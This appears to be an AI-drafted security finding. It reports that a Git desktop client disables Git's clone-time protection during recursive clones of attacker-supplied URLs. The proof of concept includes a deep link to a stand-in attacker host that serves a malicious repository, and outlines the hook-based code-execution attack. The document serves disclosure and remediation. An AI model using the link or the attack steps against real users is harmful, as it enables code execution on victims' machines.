Based on the investigation, I found a concrete, verifiable analog in the codebase—not the submodule/factory-dependency guards (which are already hardened via `sanitizeCloneName` and `isClonePathSensitive`), but a directly disabled upstream Git security protection in the clone path.

### Title
Git clone protection explicitly disabled during recursive clone of attacker-controlled repositories, re-enabling hook-based RCE (CVE-2024-32004 class) - (File: `app/src/lib/git/clone.ts`)

### Summary
`clone()` in [1](#0-0)  runs `git clone --recursive` against any URL passed in (from the Clone dialog, `x-github-client://openRepo/...` deep links parsed in `parseAppURL`, or the `--cli-clone` CLI argument handled in `app/src/main-process/main.ts`), while explicitly setting `GIT_CLONE_PROTECTION_ACTIVE: 'false'` in the process environment for every clone. This environment variable is the guard Git itself introduced to remediate CVE-2024-32004 (and the related CVE-2024-32465/32021 clone-time RCE family), where a maliciously crafted repository — including its submodules — can smuggle hooks or config that execute code during `clone --recursive`. Desktop is not merely failing to add a missing safety dependency (as in the ZKSync report), it is actively unsetting the equivalent safety check Git ships by default.

### Finding Description
Git's clone-time protection (enabled by default since the CVE-2024-32004 fix) inspects a cloned repository — and any nested repositories brought in via `--recursive` submodule init — for symlinked `.git` directories, unsafe `core.hooksPath`/`core.fsmonitor` config, or other constructs that would let a hook run as a side effect of clone before the user has had a chance to inspect the content. This is precisely analogous to the "known code" `KnownCodesStorage` check in the original report: an operation (deploying/initializing new code) is allowed to proceed only if a companion safety artifact is present and verified.

Desktop's `clone()` function [2](#0-1)  unconditionally sets:
```
GIT_CLONE_PROTECTION_ACTIVE: 'false'
```
merged into the git execution environment for the clone process, and unconditionally passes `--recursive` [3](#0-2) . There is no code path where this is set based on trust of the source (e.g., only for github.com URLs) — every call to `clone()`, whether from the UI clone dialog, a deep link, or the CLI clone action, disables the guard.

The `url` argument is fully attacker-influenced: it is parsed straight out of `x-github-client://openRepo/<url>` deep links by `parseAppURL` (validated in `app/test/unit/parse-app-url-test.ts`) and from `--cli-clone` in `app/src/main-process/main.ts` (lines 282-291), neither of which restrict the host to github.com — SSH and arbitrary HTTPS remotes are accepted, as shown by the SSH test cases in `parse-app-url-test.ts` (`git@github.com/desktop/desktop`, arbitrary hosts).

The existing hardening in this codebase — `isClonePathSensitive` (destination-path guard) and `sanitizeCloneName` (traversal-safe directory naming) — only protects the *local filesystem destination*. Neither guard inspects or restricts the *content* of the remote repository being cloned, so they do nothing to stop the class of attack that `GIT_CLONE_PROTECTION_ACTIVE` was designed to prevent.

### Impact Explanation
An attacker who controls a repository (or a submodule referenced by one) that a victim clones via Desktop — through a "Open in Desktop" deep link, a shared clone URL, or a PR fork remote add/fetch flow — can craft the repository to trigger hook execution during the recursive clone, since the very protection Git added to prevent this is turned off by Desktop for every clone. This satisfies the "attacker controls a cloned/fetched repository...result is code execution" criterion directly: arbitrary code execution on the victim's machine as a consequence of simply cloning a link.

### Likelihood Explanation
High. Every clone performed by Desktop, including from an untrusted `x-github-client://openRepo/...` deep link a user might click, exercises this code path with the protection disabled and `--recursive` submodule cloning enabled. No user interaction beyond following/clicking the clone flow is required, and no additional local access, admin rights, or pre-existing compromise is needed — matching the required "unprivileged" and "attacker controls a cloned/fetched repository" profile.

### Recommendation
Remove `GIT_CLONE_PROTECTION_ACTIVE: 'false'` from the clone environment in `app/src/lib/git/clone.ts` so Git's built-in clone-time protections remain active. If the override exists to work around a specific compatibility issue, scope it narrowly (e.g., only for verified trusted hosts) and document the justification, rather than disabling it unconditionally for all clone operations including those from untrusted URLs.

### Proof of Concept
1. Craft a malicious Git repository containing a submodule (or top-level `.git`) configured per the CVE-2024-32004 pattern (e.g., symlinked `.git` directory or unsafe `core.hooksPath`) such that cloning it with `--recursive` and without Git's clone protection triggers hook execution.
2. Host it and produce a Desktop deep link: `x-github-client://openRepo/https://attacker.example/evil/repo.git`.
3. Send the link to the victim; when clicked, Desktop's `handleAppURL` → `parseAppURL` → clone flow invokes `clone()` in `app/src/lib/git/clone.ts`, which runs `git clone --recursive` with `GIT_CLONE_PROTECTION_ACTIVE=false`.
4. Because the protection Git added specifically for this attack class is disabled, the crafted hook executes during the clone, achieving code execution on the victim's machine. [1](#0-0) [4](#0-3) [5](#0-4)
